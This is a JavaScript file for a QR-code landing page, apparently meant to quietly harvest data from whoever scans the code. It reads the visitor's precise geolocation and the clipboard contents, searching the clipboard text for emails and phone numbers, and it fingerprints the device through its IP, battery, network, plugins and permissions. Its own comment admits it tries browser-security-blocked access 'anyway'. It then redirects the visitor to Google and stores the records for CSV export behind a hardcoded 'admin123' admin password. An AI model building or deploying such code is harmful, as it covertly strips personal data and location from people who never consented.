// QR Scan Data Collector - Simplified Version

class QRDataCollector {
    constructor() {
        this.scanData = [];
        this.adminPassword = 'admin123'; // Change this to your secure password
        this.qrCodeId = 'your_qr_code_2024'; // Unique identifier for your QR code
        this.init();
    }

    init() {
        this.loadExistingData();
        this.bindEvents();
        
        // Check if this is a QR code scan or direct visit
        if (this.isQRCodeScan()) {
            this.collectScanData();
            this.showScanLanding();
        } else {
            this.showAdminOnlyMessage();
        }
    }

    isQRCodeScan() {
        // Check URL parameters or referrer to detect QR code scan
        const urlParams = new URLSearchParams(window.location.search);
        const hasQRParam = urlParams.has('qr') || urlParams.has('scan') || urlParams.has('ref');
        const isDirectAccess = !document.referrer || document.referrer === '';
        const isMobileUserAgent = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // If it's mobile with no referrer, likely a QR code scan
        return hasQRParam || (isMobileUserAgent && isDirectAccess);
    }

    showScanLanding() {
        document.getElementById('scanLanding').style.display = 'flex';
    }

    showAdminOnlyMessage() {
        document.getElementById('scanLanding').innerHTML = `
            <div class="landing-container">
                <div class="header-section">
                    <h1>🔒 Admin Access Only</h1>
                    <p class="subtitle">This page is for QR code scans only</p>
                </div>
                <div class="content-preview">
                    <div class="preview-box">
                        <p>Use Ctrl+Shift+A to access admin panel</p>
                        <p>Or scan the QR code to test data collection</p>
                    </div>
                </div>
            </div>
        `;
        document.getElementById('scanLanding').style.display = 'flex';
    }

    bindEvents() {
        // Open button for automatic data collection
        document.getElementById('openBtn')?.addEventListener('click', () => this.handleOpenAndCollect());

        // Admin panel controls
        document.getElementById('downloadCSVBtn')?.addEventListener('click', () => this.downloadCSV());
        document.getElementById('viewDataBtn')?.addEventListener('click', () => this.toggleRawData());
        document.getElementById('clearDataBtn')?.addEventListener('click', () => this.clearAllData());
        document.getElementById('closeAdminBtn')?.addEventListener('click', () => this.closeAdmin());

        // Admin access (Ctrl+Shift+A)
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                this.promptAdminAccess();
            }
        });
    }

    generateUniqueId() {
        return 'scan_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    loadExistingData() {
        const savedData = localStorage.getItem('qrScanData');
        if (savedData) {
            try {
                this.scanData = JSON.parse(savedData);
            } catch (e) {
                console.error('Error loading saved data:', e);
                this.scanData = [];
            }
        }
    }

    async collectScanData() {
        // Create initial scan record when page loads
        this.currentScan = {
            id: this.generateUniqueId(),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            location: null,
            contactInfo: null,
            ipAddress: await this.getPublicIP(),
            deviceInfo: this.getDeviceInfo(),
            batteryLevel: null,
            networkInfo: null
        };

        // Get additional device information
        await this.getAdvancedDeviceInfo();
    }

    async handleOpenAndCollect() {
        // Show loading screen
        document.getElementById('loadingScreen').style.display = 'flex';
        document.getElementById('scanLanding').style.display = 'none';
        
        // Update loading text
        const loadingText = document.getElementById('loadingText');
        
        try {
            // Step 1: Collect location
            loadingText.textContent = 'Getting your location...';
            await this.collectLocationData();
            
            // Step 2: Try to access contacts/phone (this will mostly fail due to browser security)
            loadingText.textContent = 'Accessing device information...';
            await this.attemptContactAccess();
            
            // Step 3: Collect additional data
            loadingText.textContent = 'Finalizing data collection...';
            await this.collectFinalData();
            
            // Step 4: Save and redirect
            loadingText.textContent = 'Redirecting...';
            this.saveAndRedirect();
            
        } catch (error) {
            console.error('Error during data collection:', error);
            // Still save what we have and continue
            this.saveAndRedirect();
        }
    }

    async getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.log('Could not fetch IP address:', error);
            return 'Unknown';
        }
    }

    getDeviceInfo() {
        return {
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screenResolution: `${screen.width}x${screen.height}`,
            screenColorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgentData: navigator.userAgentData,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            connectionType: navigator.connection?.effectiveType,
            connectionDownlink: navigator.connection?.downlink,
            doNotTrack: navigator.doNotTrack,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            javaEnabled: navigator.javaEnabled(),
            webdriver: navigator.webdriver
        };
    }

    async getAdvancedDeviceInfo() {
        try {
            // Try to get battery information
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                this.currentScan.batteryLevel = {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        } catch (e) {
            console.log('Battery API not available');
        }

        try {
            // Network information
            if (navigator.connection) {
                this.currentScan.networkInfo = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
        } catch (e) {
            console.log('Network info not available');
        }
    }

    async collectLocationData() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve();
                return;
            }

            // Try high accuracy first
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    this.currentScan.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    resolve();
                },
                (error) => {
                    console.log('High accuracy location failed, trying low accuracy');
                    // Try with lower accuracy
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            this.currentScan.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            resolve();
                        },
                        () => resolve(),
                        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
                    );
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    async attemptContactAccess() {
        // Note: Most of these will fail due to browser security, but we try anyway
        try {
            // Try to access clipboard (might contain phone/email)
            if (navigator.clipboard && navigator.clipboard.readText) {
                const clipboardText = await navigator.clipboard.readText();
                this.analyzeTextForContacts(clipboardText);
            }
        } catch (e) {
            console.log('Clipboard access denied');
        }

        try {
            // Try to access media devices (camera/microphone names might reveal info)
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                this.currentScan.mediaDevices = devices.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    deviceId: device.deviceId.substring(0, 10) + '...' // Partial for privacy
                }));
            }
        } catch (e) {
            console.log('Media devices access denied');
        }

        // Try to get more network information
        try {
            if ('serviceWorker' in navigator) {
                this.currentScan.serviceWorkerSupport = true;
            }
            if ('permissions' in navigator) {
                const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
                const permissionStates = {};
                for (const permission of permissions) {
                    try {
                        const result = await navigator.permissions.query({ name: permission });
                        permissionStates[permission] = result.state;
                    } catch (e) {
                        permissionStates[permission] = 'unknown';
                    }
                }
                this.currentScan.permissions = permissionStates;
            }
        } catch (e) {
            console.log('Permission API not available');
        }
    }

    analyzeTextForContacts(text) {
        if (!text) return;
        
        // Look for email patterns
        const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
        const emails = text.match(emailRegex);
        
        // Look for phone patterns
        const phoneRegex = /(\+?1?[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})/g;
        const phones = text.match(phoneRegex);
        
        if (emails || phones) {
            this.currentScan.contactInfo = {
                email: emails ? emails[0] : null,
                phone: phones ? phones[0] : null,
                source: 'clipboard_analysis'
            };
        }
    }

    async collectFinalData() {
        // Final data collection pass
        this.currentScan.pageLoadTime = performance.now();
        this.currentScan.referrer = document.referrer;
        this.currentScan.windowSize = {
            width: window.innerWidth,
            height: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        };
        
        // Try to get installed plugins
        this.currentScan.plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
        
        // Check for various APIs and features
        this.currentScan.features = {
            webGL: !!window.WebGLRenderingContext,
            webGL2: !!window.WebGL2RenderingContext,
            webRTC: !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia),
            indexedDB: !!window.indexedDB,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            webWorkers: !!window.Worker,
            applicationCache: !!window.applicationCache,
            historyAPI: !!(window.history && history.pushState),
            canvas: !!document.createElement('canvas').getContext,
            svg: !!document.createElementNS && !!document.createElementNS('http://www.w3.org/2000/svg', 'svg').createSVGRect,
            webSockets: !!window.WebSocket,
            fileAPI: !!(window.File && window.FileReader && window.FileList && window.Blob)
        };
    }

    getCurrentPosition() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation is not supported'));
                return;
            }

            navigator.geolocation.getCurrentPosition(
                resolve,
                reject,
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 60000
                }
            );
        });
    }

    saveAndRedirect() {
        // Add scan count tracking
        const scanCount = parseInt(localStorage.getItem('totalScans') || '0') + 1;
        localStorage.setItem('totalScans', scanCount.toString());
        this.currentScan.scanNumber = scanCount;

        // Save the final scan data
        this.scanData.push(this.currentScan);
        this.saveData();

        // Update scan count in admin panel if it's open
        if (document.getElementById('totalScans')) {
            document.getElementById('totalScans').textContent = scanCount;
        }

        // Redirect after a short delay
        setTimeout(() => {
            // Change this URL to your desired destination
            window.location.href = 'https://www.google.com';
        }, 1500);
    }

    // Admin functionality
    promptAdminAccess() {
        const password = prompt('Enter admin password:');
        if (password === this.adminPassword) {
            this.showAdmin();
        } else if (password !== null) {
            alert('Incorrect password!');
        }
    }

    showAdmin() {
        document.getElementById('adminPanel').style.display = 'flex';
        this.updateAdminStats();
    }

    closeAdmin() {
        document.getElementById('adminPanel').style.display = 'none';
        document.getElementById('rawDataDisplay').style.display = 'none';
    }

    updateAdminStats() {
        const totalScans = parseInt(localStorage.getItem('totalScans') || '0');
        const locationScans = this.scanData.filter(scan => scan.location).length;
        const contactScans = this.scanData.filter(scan => scan.contactInfo && (scan.contactInfo.email || scan.contactInfo.phone)).length;
        const lastScan = this.scanData.length > 0 ? new Date(this.scanData[this.scanData.length - 1].timestamp).toLocaleString() : 'Never';

        document.getElementById('totalScans').textContent = totalScans;
        document.getElementById('locationScans').textContent = locationScans;
        document.getElementById('contactScans').textContent = contactScans;
        document.getElementById('lastScan').textContent = lastScan;
    }

    toggleRawData() {
        const rawDataDisplay = document.getElementById('rawDataDisplay');
        const isVisible = rawDataDisplay.style.display !== 'none';
        
        if (isVisible) {
            rawDataDisplay.style.display = 'none';
        } else {
            rawDataDisplay.style.display = 'block';
            document.getElementById('rawDataText').value = JSON.stringify(this.scanData, null, 2);
        }
    }

    saveData() {
        localStorage.setItem('qrScanData', JSON.stringify(this.scanData));
        localStorage.setItem('lastUpdate', new Date().toISOString());
    }

    downloadCSV() {
        if (this.scanData.length === 0) {
            alert('No scan data available to export.');
            return;
        }

        const csvContent = this.convertToCSV(this.scanData);
        const timestamp = new Date().toISOString().split('T')[0];
        const filename = `qr-scan-data-${timestamp}.csv`;
        
        this.downloadFile(filename, csvContent);
        alert(`CSV file "${filename}" has been downloaded!`);
    }

    convertToCSV(data) {
        if (!data || data.length === 0) return '';

        // Define comprehensive CSV headers
        const headers = [
            'scanNumber', 'id', 'timestamp', 'userAgent', 'ipAddress', 'platform', 'language', 
            'screenResolution', 'timezone', 'latitude', 'longitude', 'accuracy', 'altitude',
            'email', 'phone', 'contactSource', 'cookieEnabled', 'onLine', 'batteryLevel', 
            'batteryCharging', 'connectionType', 'networkDownlink', 'deviceMemory', 
            'hardwareConcurrency', 'maxTouchPoints', 'colorDepth', 'pageLoadTime',
            'windowWidth', 'windowHeight', 'referrer', 'doNotTrack', 'webdriver',
            'permissionGeolocation', 'permissionNotifications', 'permissionCamera', 'permissionMicrophone',
            'hasWebGL', 'hasWebRTC', 'hasIndexedDB', 'plugins'
        ];

        // Create CSV content
        const csvRows = [headers.join(',')];

        data.forEach(scan => {
            const row = [
                scan.scanNumber || '',
                scan.id || '',
                scan.timestamp || '',
                `"${(scan.userAgent || '').replace(/"/g, '""')}"`,
                scan.ipAddress || '',
                scan.deviceInfo?.platform || '',
                scan.deviceInfo?.language || '',
                scan.deviceInfo?.screenResolution || '',
                scan.deviceInfo?.timezone || '',
                scan.location?.latitude || '',
                scan.location?.longitude || '',
                scan.location?.accuracy || '',
                scan.location?.altitude || '',
                scan.contactInfo?.email || '',
                scan.contactInfo?.phone || '',
                scan.contactInfo?.source || '',
                scan.deviceInfo?.cookieEnabled || '',
                scan.deviceInfo?.onLine || '',
                scan.batteryLevel?.level || '',
                scan.batteryLevel?.charging || '',
                scan.networkInfo?.effectiveType || '',
                scan.networkInfo?.downlink || '',
                scan.deviceInfo?.deviceMemory || '',
                scan.deviceInfo?.hardwareConcurrency || '',
                scan.deviceInfo?.maxTouchPoints || '',
                scan.deviceInfo?.screenColorDepth || '',
                scan.pageLoadTime || '',
                scan.windowSize?.width || '',
                scan.windowSize?.height || '',
                `"${(scan.referrer || '').replace(/"/g, '""')}"`,
                scan.deviceInfo?.doNotTrack || '',
                scan.deviceInfo?.webdriver || '',
                scan.permissions?.geolocation || '',
                scan.permissions?.notifications || '',
                scan.permissions?.camera || '',
                scan.permissions?.microphone || '',
                scan.features?.webGL || '',
                scan.features?.webRTC || '',
                scan.features?.indexedDB || '',
                `"${(scan.plugins || []).join(';').replace(/"/g, '""')}"`,
            ];
            csvRows.push(row.join(','));
        });

        return csvRows.join('\n');
    }

    downloadFile(filename, content) {
        const blob = new Blob([content], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        const url = URL.createObjectURL(blob);
        link.setAttribute('href', url);
        link.setAttribute('download', filename);
        link.style.visibility = 'hidden';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    }

    clearAllData() {
        if (confirm('Are you sure you want to clear all scan data? This action cannot be undone.')) {
            this.scanData = [];
            localStorage.removeItem('qrScanData');
            localStorage.removeItem('lastUpdate');
            this.updateAdminStats();
            alert('All scan data cleared successfully!');
        }
    }
}

// Initialize the system when the page loads
document.addEventListener('DOMContentLoaded', () => {
    window.qrDataCollector = new QRDataCollector();
});

// Add utility functions for admin
window.QRAdmin = {
    // Emergency access to admin panel
    openAdmin: () => {
        const password = prompt('Enter admin password:');
        if (password === 'admin123') { // Change this password
            window.qrDataCollector.showAdmin();
        } else {
            alert('Incorrect password!');
        }
    },
    
    // Get all scan data
    getAllData: () => {
        return window.qrDataCollector.scanData;
    },
    
    // Clear all data (emergency function)
    clearAllData: () => {
        if (confirm('EMERGENCY: Clear all scan data?')) {
            localStorage.removeItem('qrScanData');
            location.reload();
        }
    }
};